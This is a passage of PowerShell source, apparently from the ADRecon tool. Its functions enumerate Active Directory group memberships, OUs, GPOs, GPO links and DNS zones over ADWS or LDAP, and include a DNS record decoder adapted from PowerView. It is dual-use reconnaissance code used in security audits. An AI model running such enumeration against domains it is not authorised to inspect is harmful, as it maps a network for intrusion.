            Write-Warning "[Get-ADRGroupMember] Error while enumerating GroupMember Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }
        $ObjSearcher.dispose()

        If ( ($ADDomainSID) -and ($ADGroups) -and ($ADGroupMembers) )
        {
            Write-Verbose "[*] Total GroupMember Objects: $([ADRecon.LDAPClass]::ObjectCount($ADGroupMembers))"
            $GroupMemberObj = [ADRecon.LDAPClass]::GroupMemberParser($ADGroups, $ADGroupMembers, $ADDomainSID, $Threads)
            Remove-Variable ADGroups
            Remove-Variable ADGroupMembers
            Remove-Variable ADDomainSID
        }
    }

    If ($GroupMemberObj)
    {
        Return $GroupMemberObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADROU
{
<#
.SYNOPSIS
    Returns all Organizational Units (OU) in the current (or specified) domain.

.DESCRIPTION
    Returns all Organizational Units (OU) in the current (or specified) domain.

.PARAMETER Protocol
    [string]
    Which protocol to use; ADWS (default) or LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.PARAMETER Threads
    [int]
    The number of threads to use during processing of objects. Default 10.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Protocol,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $true)]
        [int] $PageSize,

        [Parameter(Mandatory = $false)]
        [int] $Threads = 10
    )

    If ($Protocol -eq 'ADWS')
    {
        Try
        {
            $ADOUs = @( Get-ADOrganizationalUnit -Filter * -Properties DistinguishedName,Description,Name,whenCreated,whenChanged )
        }
        Catch
        {
            Write-Warning "[Get-ADROU] Error while enumerating OU Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }

        If ($ADOUs)
        {
            Write-Verbose "[*] Total OUs: $([ADRecon.ADWSClass]::ObjectCount($ADOUs))"
            $OUObj = [ADRecon.ADWSClass]::OUParser($ADOUs, $Threads)
            Remove-Variable ADOUs
        }
    }

    If ($Protocol -eq 'LDAP')
    {
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = "(objectclass=organizationalunit)"
        $ObjSearcher.PropertiesToLoad.AddRange(("distinguishedname","description","name","whencreated","whenchanged"))
        $ObjSearcher.SearchScope = "Subtree"

        Try
        {
            $ADOUs = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning "[Get-ADROU] Error while enumerating OU Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }
        $ObjSearcher.dispose()

        If ($ADOUs)
        {
            Write-Verbose "[*] Total OUs: $([ADRecon.LDAPClass]::ObjectCount($ADOUs))"
            $OUObj = [ADRecon.LDAPClass]::OUParser($ADOUs, $Threads)
            Remove-Variable ADOUs
        }
    }

    If ($OUObj)
    {
        Return $OUObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRGPO
{
<#
.SYNOPSIS
    Returns all Group Policy Objects (GPO) in the current (or specified) domain.

.DESCRIPTION
    Returns all Group Policy Objects (GPO) in the current (or specified) domain.

.PARAMETER Protocol
    [string]
    Which protocol to use; ADWS (default) or LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER Credential
    [Management.Automation.PSCredential]
    Credentials.

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.PARAMETER Threads
    [int]
    The number of threads to use during processing of objects. Default 10.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Protocol,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $true)]
        [int] $PageSize,

        [Parameter(Mandatory = $false)]
        [int] $Threads = 10
    )

    If ($Protocol -eq 'ADWS')
    {
        Try
        {
            $ADGPOs = @( Get-ADObject -LDAPFilter '(objectCategory=groupPolicyContainer)' -Properties DisplayName,DistinguishedName,Name,gPCFileSysPath,whenCreated,whenChanged )
        }
        Catch
        {
            Write-Warning "[Get-ADRGPO] Error while enumerating groupPolicyContainer Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }

        If ($ADGPOs)
        {
            Write-Verbose "[*] Total GPOs: $([ADRecon.ADWSClass]::ObjectCount($ADGPOs))"
            $GPOsObj = [ADRecon.ADWSClass]::GPOParser($ADGPOs, $Threads)
            Remove-Variable ADGPOs
        }
    }

    If ($Protocol -eq 'LDAP')
    {
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = "(objectCategory=groupPolicyContainer)"
        $ObjSearcher.SearchScope = "Subtree"

        Try
        {
            $ADGPOs = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning "[Get-ADRGPO] Error while enumerating groupPolicyContainer Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }
        $ObjSearcher.dispose()

        If ($ADGPOs)
        {
            Write-Verbose "[*] Total GPOs: $([ADRecon.LDAPClass]::ObjectCount($ADGPOs))"
            $GPOsObj = [ADRecon.LDAPClass]::GPOParser($ADGPOs, $Threads)
            Remove-Variable ADGPOs
        }
    }

    If ($GPOsObj)
    {
        Return $GPOsObj
    }
    Else
    {
        Return $null
    }
}

# based on https://github.com/GoateePFE/GPLinkReport/blob/master/gPLinkReport.ps1
Function Get-ADRGPLink
{
<#
.SYNOPSIS
    Returns all group policy links (gPLink) applied to Scope of Management (SOM) in the current (or specified) domain.

.DESCRIPTION
    Returns all group policy links (gPLink) applied to Scope of Management (SOM) in the current (or specified) domain.

.PARAMETER Protocol
    [string]
    Which protocol to use; ADWS (default) or LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.PARAMETER Threads
    [int]
    The number of threads to use during processing of objects. Default 10.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Protocol,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $true)]
        [int] $PageSize,

        [Parameter(Mandatory = $false)]
        [int] $Threads = 10
    )

    If ($Protocol -eq 'ADWS')
    {
        Try
        {
            $ADSOMs = @( Get-ADObject -LDAPFilter '(|(objectclass=domain)(objectclass=organizationalUnit))' -Properties DistinguishedName,Name,gPLink,gPOptions )
            $ADSOMs += @( Get-ADObject -SearchBase "CN=Sites,$((Get-ADRootDSE).configurationNamingContext)" -LDAPFilter "(objectclass=site)" -Properties DistinguishedName,Name,gPLink,gPOptions )
        }
        Catch
        {
            Write-Warning "[Get-ADRGPLink] Error while enumerating SOM Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }

        Try
        {
            $ADGPOs = @( Get-ADObject -LDAPFilter '(objectCategory=groupPolicyContainer)' -Properties DisplayName,DistinguishedName )
        }
        Catch
        {
            Write-Warning "[Get-ADRGPLink] Error while enumerating groupPolicyContainer Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }

        If ( ($ADSOMs) -and ($ADGPOs) )
        {
            Write-Verbose "[*] Total SOMs: $([ADRecon.ADWSClass]::ObjectCount($ADSOMs))"
            $SOMObj = [ADRecon.ADWSClass]::SOMParser($ADGPOs, $ADSOMs, $Threads)
            Remove-Variable ADSOMs
            Remove-Variable ADGPOs
        }
    }

    If ($Protocol -eq 'LDAP')
    {
        $ADSOMs = @()
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = "(|(objectclass=domain)(objectclass=organizationalUnit))"
        $ObjSearcher.PropertiesToLoad.AddRange(("distinguishedname","name","gplink","gpoptions"))
        $ObjSearcher.SearchScope = "Subtree"

        Try
        {
            $ADSOMs += $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning "[Get-ADRGPLink] Error while enumerating SOM Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }
        $ObjSearcher.dispose()

        $SearchPath = "CN=Sites"
        If ($Credential -ne [Management.Automation.PSCredential]::Empty)
        {
            $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$SearchPath,$($objDomainRootDSE.ConfigurationNamingContext)", $Credential.UserName,$Credential.GetNetworkCredential().Password
        }
        Else
        {
            $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$SearchPath,$($objDomainRootDSE.ConfigurationNamingContext)"
        }
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
        $ObjSearcher.Filter = "(objectclass=site)"
        $ObjSearcher.PropertiesToLoad.AddRange(("distinguishedname","name","gplink","gpoptions"))
        $ObjSearcher.SearchScope = "Subtree"

        Try
        {
            $ADSOMs += $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning "[Get-ADRGPLink] Error while enumerating SOM Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }
        $ObjSearcher.dispose()

        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = "(objectCategory=groupPolicyContainer)"
        $ObjSearcher.SearchScope = "Subtree"

        Try
        {
            $ADGPOs = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning "[Get-ADRGPLink] Error while enumerating groupPolicyContainer Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }
        $ObjSearcher.dispose()

        If ( ($ADSOMs) -and ($ADGPOs) )
        {
            Write-Verbose "[*] Total SOMs: $([ADRecon.LDAPClass]::ObjectCount($ADSOMs))"
            $SOMObj = [ADRecon.LDAPClass]::SOMParser($ADGPOs, $ADSOMs, $Threads)
            Remove-Variable ADSOMs
            Remove-Variable ADGPOs
        }
    }

    If ($SOMObj)
    {
        Return $SOMObj
    }
    Else
    {
        Return $null
    }
}

# Modified Convert-DNSRecord function from https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
Function Convert-DNSRecord
{
<#
.SYNOPSIS

Helpers that decodes a binary DNS record blob.

Author: Michael B. Smith, Will Schroeder (@harmj0y)
License: BSD 3-Clause
Required Dependencies: None

.DESCRIPTION

Decodes a binary blob representing an Active Directory DNS entry.
Used by Get-DomainDNSRecord.

Adapted/ported from Michael B. Smith's code at https://raw.githubusercontent.com/mmessano/PowerShell/master/dns-dump.ps1

.PARAMETER DNSRecord

A byte array representing the DNS record.

.OUTPUTS

System.Management.Automation.PSCustomObject

Outputs custom PSObjects with detailed information about the DNS record entry.

.LINK

https://raw.githubusercontent.com/mmessano/PowerShell/master/dns-dump.ps1
#>

    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Byte[]]
        $DNSRecord
    )

    BEGIN {
        Function Get-Name
        {
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseOutputTypeCorrectly', '')]
            [CmdletBinding()]
            Param(
                [Byte[]]
                $Raw
            )

            [Int]$Length = $Raw[0]
            [Int]$Segments = $Raw[1]
            [Int]$Index =  2
            [String]$Name  = ''

            while ($Segments-- -gt 0)
            {
                [Int]$SegmentLength = $Raw[$Index++]
                while ($SegmentLength-- -gt 0)
                {
                    $Name += [Char]$Raw[$Index++]
                }
                $Name += "."
            }
            $Name
        }
    }

    PROCESS
    {
        # $RDataLen = [BitConverter]::ToUInt16($DNSRecord, 0)
        $RDataType = [BitConverter]::ToUInt16($DNSRecord, 2)
        $UpdatedAtSerial = [BitConverter]::ToUInt32($DNSRecord, 8)

        $TTLRaw = $DNSRecord[12..15]

        # reverse for big endian
        $Null = [array]::Reverse($TTLRaw)
        $TTL = [BitConverter]::ToUInt32($TTLRaw, 0)

        $Age = [BitConverter]::ToUInt32($DNSRecord, 20)
        If ($Age -ne 0)
        {
            $TimeStamp = ((Get-Date -Year 1601 -Month 1 -Day 1 -Hour 0 -Minute 0 -Second 0).AddHours($age)).ToString()
        }
        Else
        {
            $TimeStamp = '[static]'
        }

        $DNSRecordObject = New-Object PSObject

        switch ($RDataType)
        {
            1
            {
                $IP = "{0}.{1}.{2}.{3}" -f $DNSRecord[24], $DNSRecord[25], $DNSRecord[26], $DNSRecord[27]
                $Data = $IP
                $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'A'
            }

            2
            {
                $NSName = Get-Name $DNSRecord[24..$DNSRecord.length]
                $Data = $NSName
                $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'NS'
            }

            5
            {
                $Alias = Get-Name $DNSRecord[24..$DNSRecord.length]
                $Data = $Alias
                $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'CNAME'
            }

            6
            {
                $PrimaryNS = Get-Name $DNSRecord[44..$DNSRecord.length]
                $ResponsibleParty = Get-Name $DNSRecord[$(46+$DNSRecord[44])..$DNSRecord.length]
                $SerialRaw = $DNSRecord[24..27]
                # reverse for big endian
                $Null = [array]::Reverse($SerialRaw)
                $Serial = [BitConverter]::ToUInt32($SerialRaw, 0)

                $RefreshRaw = $DNSRecord[28..31]
                $Null = [array]::Reverse($RefreshRaw)
                $Refresh = [BitConverter]::ToUInt32($RefreshRaw, 0)

                $RetryRaw = $DNSRecord[32..35]
                $Null = [array]::Reverse($RetryRaw)
                $Retry = [BitConverter]::ToUInt32($RetryRaw, 0)

                $ExpiresRaw = $DNSRecord[36..39]
                $Null = [array]::Reverse($ExpiresRaw)
                $Expires = [BitConverter]::ToUInt32($ExpiresRaw, 0)

                $MinTTLRaw = $DNSRecord[40..43]
                $Null = [array]::Reverse($MinTTLRaw)
                $MinTTL = [BitConverter]::ToUInt32($MinTTLRaw, 0)

                $Data = "[" + $Serial + "][" + $PrimaryNS + "][" + $ResponsibleParty + "][" + $Refresh + "][" + $Retry + "][" + $Expires + "][" + $MinTTL + "]"
                $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'SOA'
            }

            12
            {
                $Ptr = Get-Name $DNSRecord[24..$DNSRecord.length]
                $Data = $Ptr
                $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'PTR'
            }

            13
            {
                [string]$CPUType = ""
                [string]$OSType  = ""
                [int]$SegmentLength = $DNSRecord[24]
                $Index = 25
                while ($SegmentLength-- -gt 0)
                {
                    $CPUType += [char]$DNSRecord[$Index++]
                }
                $Index = 24 + $DNSRecord[24] + 1
                [int]$SegmentLength = $Index++
                while ($SegmentLength-- -gt 0)
                {
                    $OSType += [char]$DNSRecord[$Index++]
                }
                $Data = "[" + $CPUType + "][" + $OSType + "]"
                $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'HINFO'
            }

            15
            {
                $PriorityRaw = $DNSRecord[24..25]
                # reverse for big endian
                $Null = [array]::Reverse($PriorityRaw)
                $Priority = [BitConverter]::ToUInt16($PriorityRaw, 0)
                $MXHost   = Get-Name $DNSRecord[26..$DNSRecord.length]
                $Data = "[" + $Priority + "][" + $MXHost + "]"
                $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'MX'
            }

            16
            {
                [string]$TXT  = ''
                [int]$SegmentLength = $DNSRecord[24]
                $Index = 25
                while ($SegmentLength-- -gt 0)
                {
                    $TXT += [char]$DNSRecord[$Index++]
                }
                $Data = $TXT
                $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'TXT'
            }

            28
            {
        		### yeah, this doesn't do all the fancy formatting that can be done for IPv6
                $AAAA = ""
                for ($i = 24; $i -lt 40; $i+=2)
                {
                    $BlockRaw = $DNSRecord[$i..$($i+1)]
                    # reverse for big endian
                    $Null = [array]::Reverse($BlockRaw)
                    $Block = [BitConverter]::ToUInt16($BlockRaw, 0)
			        $AAAA += ($Block).ToString('x4')
			        If ($i -ne 38)
                    {
                        $AAAA += ':'
                    }
                }
                $Data = $AAAA
                $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'AAAA'
            }

            33
            {
                $PriorityRaw = $DNSRecord[24..25]
                # reverse for big endian
                $Null = [array]::Reverse($PriorityRaw)
                $Priority = [BitConverter]::ToUInt16($PriorityRaw, 0)

                $WeightRaw = $DNSRecord[26..27]
                $Null = [array]::Reverse($WeightRaw)
                $Weight = [BitConverter]::ToUInt16($WeightRaw, 0)

                $PortRaw = $DNSRecord[28..29]
                $Null = [array]::Reverse($PortRaw)
                $Port = [BitConverter]::ToUInt16($PortRaw, 0)

                $SRVHost = Get-Name $DNSRecord[30..$DNSRecord.length]
                $Data = "[" + $Priority + "][" + $Weight + "][" + $Port + "][" + $SRVHost + "]"
                $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'SRV'
            }

            default
            {
                $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
                $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'UNKNOWN'
            }
        }
        $DNSRecordObject | Add-Member Noteproperty 'UpdatedAtSerial' $UpdatedAtSerial
        $DNSRecordObject | Add-Member Noteproperty 'TTL' $TTL
        $DNSRecordObject | Add-Member Noteproperty 'Age' $Age
        $DNSRecordObject | Add-Member Noteproperty 'TimeStamp' $TimeStamp
        $DNSRecordObject | Add-Member Noteproperty 'Data' $Data
        Return $DNSRecordObject
    }
}

Function Get-ADRDNSZone
{
<#
.SYNOPSIS
    Returns all DNS Zones and Records in the current (or specified) domain.

.DESCRIPTION
    Returns all DNS Zones and Records in the current (or specified) domain.

.PARAMETER Protocol
    [string]
    Which protocol to use; ADWS (default) or LDAP.

.PARAMETER ADROutputDir
    [string]
    Path for ADRecon output folder.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER DomainController
    [string]
    IP Address of the Domain Controller.

.PARAMETER Credential
    [Management.Automation.PSCredential]
    Credentials.

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.PARAMETER OutputType
    [array]
    Output Type.

.OUTPUTS
    CSV files are created in the folder specified with the information.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Protocol,

        [Parameter(Mandatory = $true)]
        [string] $ADROutputDir,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $false)]
        [string] $DomainController,

        [Parameter(Mandatory = $false)]
        [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $true)]
        [int] $PageSize,

        [Parameter(Mandatory = $true)]
        [array] $OutputType
    )

    If ($Protocol -eq 'ADWS')
    {
        Try
        {
            $ADDNSZones = Get-ADObject -LDAPFilter '(objectClass=dnsZone)' -Properties Name,whenCreated,whenChanged,usncreated,usnchanged,distinguishedname
        }
        Catch
        {
            Write-Warning "[Get-ADRDNSZone] Error while enumerating dnsZone Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
        }

        $DNSZoneArray = @()
        If ($ADDNSZones)
        {
            $DNSZoneArray += $ADDNSZones
            Remove-Variable ADDNSZones
        }

        Try
        {
            $ADDNSZones1 = Get-ADObject -LDAPFilter '(objectClass=dnsZone)' -SearchBase "DC=DomainDnsZones,$((Get-ADDomain).DistinguishedName)" -Properties Name,whenCreated,whenChanged,usncreated,usnchanged,distinguishedname
        }
        Catch
        {
            Write-Warning "[Get-ADRDNSZone] Error while enumerating DomainDnsZones dnsZone Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
        }
        If ($ADDNSZones1)
        {
            $DNSZoneArray += $ADDNSZones1
            Remove-Variable ADDNSZones1
        }

        Try
        {
            $ADDNSZones2 = Get-ADObject -LDAPFilter '(objectClass=dnsZone)' -SearchBase "DC=ForestDnsZones,$((Get-ADDomain).DistinguishedName)" -Properties Name,whenCreated,whenChanged,usncreated,usnchanged,distinguishedname
        }
        Catch
        {
            Write-Warning "[Get-ADRDNSZone] Error while enumerating DC=ForestDnsZones,$((Get-ADDomain).DistinguishedName) dnsZone Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
        }
        If ($ADDNSZones2)
        {
            $DNSZoneArray += $ADDNSZones2
            Remove-Variable ADDNSZones2
        }

        Write-Verbose "[*] Total DNS Zones: $([ADRecon.ADWSClass]::ObjectCount($DNSZoneArray))"

        If ($DNSZoneArray)
        {
            $ADDNSZonesObj = @()
            $ADDNSNodesObj = @()
            $DNSZoneArray | ForEach-Object {
                # Create the object for each instance.
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name Name -Value $([ADRecon.ADWSClass]::CleanString($_.Name))
                Try
                {
                    $DNSNodes = Get-ADObject -SearchBase $($_.DistinguishedName) -LDAPFilter '(objectClass=dnsNode)' -Properties DistinguishedName,dnsrecord,dNSTombstoned,Name,ProtectedFromAccidentalDeletion,showInAdvancedViewOnly,whenChanged,whenCreated
                }
                Catch
                {
                    Write-Warning "[Get-ADRDNSZone] Error while enumerating $($_.DistinguishedName) dnsNode Objects"
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                }
                If ($DNSNodes)
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name RecordCount -Value $($DNSNodes | Measure-Object | Select-Object -ExpandProperty Count)
                    $DNSNodes | ForEach-Object {
                        $ObjNode = New-Object PSObject
                        $ObjNode | Add-Member -MemberType NoteProperty -Name ZoneName -Value $Obj.Name
                        $ObjNode | Add-Member -MemberType NoteProperty -Name Name -Value $_.Name
                        Try
                        {
                            $DNSRecord = Convert-DNSRecord $_.dnsrecord[0]
                        }
                        Catch
                        {
                            Write-Warning "[Get-ADRDNSZone] Error while converting the DNSRecord"
                            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                        }
                        $ObjNode | Add-Member -MemberType NoteProperty -Name RecordType -Value $DNSRecord.RecordType
                        $ObjNode | Add-Member -MemberType NoteProperty -Name Data -Value $DNSRecord.Data
                        $ObjNode | Add-Member -MemberType NoteProperty -Name TTL -Value $DNSRecord.TTL
                        $ObjNode | Add-Member -MemberType NoteProperty -Name Age -Value $DNSRecord.Age
                        $ObjNode | Add-Member -MemberType NoteProperty -Name TimeStamp -Value $DNSRecord.TimeStamp
                        $ObjNode | Add-Member -MemberType NoteProperty -Name UpdatedAtSerial -Value $DNSRecord.UpdatedAtSerial
                        $ObjNode | Add-Member -MemberType NoteProperty -Name whenCreated -Value $_.whenCreated
                        $ObjNode | Add-Member -MemberType NoteProperty -Name whenChanged -Value $_.whenChanged
                        # TO DO LDAP part
                        #$ObjNode | Add-Member -MemberType NoteProperty -Name dNSTombstoned -Value $_.dNSTombstoned
                        #$ObjNode | Add-Member -MemberType NoteProperty -Name ProtectedFromAccidentalDeletion -Value $_.ProtectedFromAccidentalDeletion
                        $ObjNode | Add-Member -MemberType NoteProperty -Name showInAdvancedViewOnly -Value $_.showInAdvancedViewOnly
                        $ObjNode | Add-Member -MemberType NoteProperty -Name DistinguishedName -Value $_.DistinguishedName
                        $ADDNSNodesObj += $ObjNode
                        If ($DNSRecord)
                        {
                            Remove-Variable DNSRecord
                        }
                    }
                }
                Else
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name RecordCount -Value $null
                }
                $Obj | Add-Member -MemberType NoteProperty -Name USNCreated -Value $_.usncreated
                $Obj | Add-Member -MemberType NoteProperty -Name USNChanged -Value $_.usnchanged
                $Obj | Add-Member -MemberType NoteProperty -Name whenCreated -Value $_.whenCreated
                $Obj | Add-Member -MemberType NoteProperty -Name whenChanged -Value $_.whenChanged
                $Obj | Add-Member -MemberType NoteProperty -Name DistinguishedName -Value $_.DistinguishedName
                $ADDNSZonesObj += $Obj
            }
            Write-Verbose "[*] Total DNS Records: $([ADRecon.ADWSClass]::ObjectCount($ADDNSNodesObj))"
            Remove-Variable DNSZoneArray
        }
    }

    If ($Protocol -eq 'LDAP')
    {
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.PropertiesToLoad.AddRange(("name","whencreated","whenchanged","usncreated","usnchanged","distinguishedname"))
        $ObjSearcher.Filter = "(objectClass=dnsZone)"
        $ObjSearcher.SearchScope = "Subtree"

        Try
        {
            $ADDNSZones = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning "[Get-ADRDNSZone] Error while enumerating dnsZone Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
        }
        $ObjSearcher.dispose()

        $DNSZoneArray = @()
        If ($ADDNSZones)
        {
            $DNSZoneArray += $ADDNSZones
            Remove-Variable ADDNSZones
        }

        $SearchPath = "DC=DomainDnsZones"
        If ($Credential -ne [Management.Automation.PSCredential]::Empty)
        {
            $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$($SearchPath),$($objDomain.distinguishedName)", $Credential.UserName,$Credential.GetNetworkCredential().Password
        }
        Else
        {
            $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($SearchPath),$($objDomain.distinguishedName)"
        }
        $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
        $objSearcherPath.Filter = "(objectClass=dnsZone)"
        $objSearcherPath.PageSize = $PageSize
        $objSearcherPath.PropertiesToLoad.AddRange(("name","whencreated","whenchanged","usncreated","usnchanged","distinguishedname"))
        $objSearcherPath.SearchScope = "Subtree"

        Try
        {
            $ADDNSZones1 = $objSearcherPath.FindAll()
        }
        Catch
        {
            Write-Warning "[Get-ADRDNSZone] Error while enumerating DomainDnsZones dnsZone Objects."
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
        }
        $objSearcherPath.dispose()

        If ($ADDNSZones1)
        {
            $DNSZoneArray += $ADDNSZones1
            Remove-Variable ADDNSZones1
        }

        $SearchPath = "DC=ForestDnsZones"
        If ($Credential -ne [Management.Automation.PSCredential]::Empty)
        {
            $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$($SearchPath),$($objDomain.distinguishedName)", $Credential.UserName,$Credential.GetNetworkCredential().Password
        }
        Else
        {
            $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($SearchPath),$($objDomain.distinguishedName)"
        }
        $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
        $objSearcherPath.Filter = "(objectClass=dnsZone)"
        $objSearcherPath.PageSize = $PageSize
        $objSearcherPath.PropertiesToLoad.AddRange(("name","whencreated","whenchanged","usncreated","usnchanged","distinguishedname"))
        $objSearcherPath.SearchScope = "Subtree"

        Try
        {
            $ADDNSZones2 = $objSearcherPath.FindAll()
        }
        Catch
        {
            Write-Warning "[Get-ADRDNSZone] Error while enumerating ForestDnsZones dnsZone Objects."
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
        }
        $objSearcherPath.dispose()

        If ($ADDNSZones2)
        {
            $DNSZoneArray += $ADDNSZones2
            Remove-Variable ADDNSZones2
        }

        Write-Verbose "[*] Total DNS Zones: $([ADRecon.LDAPClass]::ObjectCount($DNSZoneArray))"

        If ($DNSZoneArray)
        {
            $ADDNSZonesObj = @()
            $ADDNSNodesObj = @()
            $DNSZoneArray | ForEach-Object {
                If ($Credential -ne [Management.Automation.PSCredential]::Empty)
                {
                    $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$($_.Properties.distinguishedname)", $Credential.UserName,$Credential.GetNetworkCredential().Password
                }
                Else
                {
                    $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($_.Properties.distinguishedname)"
                }
                $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
                $objSearcherPath.Filter = "(objectClass=dnsNode)"
                $objSearcherPath.PageSize = $PageSize
                $objSearcherPath.PropertiesToLoad.AddRange(("distinguishedname","dnsrecord","name","dc","showinadvancedviewonly","whenchanged","whencreated"))
                Try
                {
                    $DNSNodes = $objSearcherPath.FindAll()
                }
                Catch
                {
                    Write-Warning "[Get-ADRDNSZone] Error while enumerating $($_.Properties.distinguishedname) dnsNode Objects"
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                }
                $objSearcherPath.dispose()
                Remove-Variable objSearchPath

                # Create the object for each instance.
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name Name -Value $([ADRecon.LDAPClass]::CleanString($_.Properties.name[0]))
                If ($DNSNodes)
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name RecordCount -Value $($DNSNodes | Measure-Object | Select-Object -ExpandProperty Count)
                    $DNSNodes | ForEach-Object {
                        $ObjNode = New-Object PSObject
                        $ObjNode | Add-Member -MemberType NoteProperty -Name ZoneName -Value $Obj.Name
                        $name = ([string] $($_.Properties.name))
                        If (-Not $name)
                        {
                            $name = ([string] $($_.Properties.dc))
                        }
                        $ObjNode | Add-Member -MemberType NoteProperty -Name Name -Value $name
                        Try
                        {
                            $DNSRecord = Convert-DNSRecord $_.Properties.dnsrecord[0]
                        }
                        Catch
                        {
                            Write-Warning "[Get-ADRDNSZone] Error while converting the DNSRecord"
                            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                        }
                        $ObjNode | Add-Member -MemberType NoteProperty -Name RecordType -Value $DNSRecord.RecordType
                        $ObjNode | Add-Member -MemberType NoteProperty -Name Data -Value $DNSRecord.Data
                        $ObjNode | Add-Member -MemberType NoteProperty -Name TTL -Value $DNSRecord.TTL
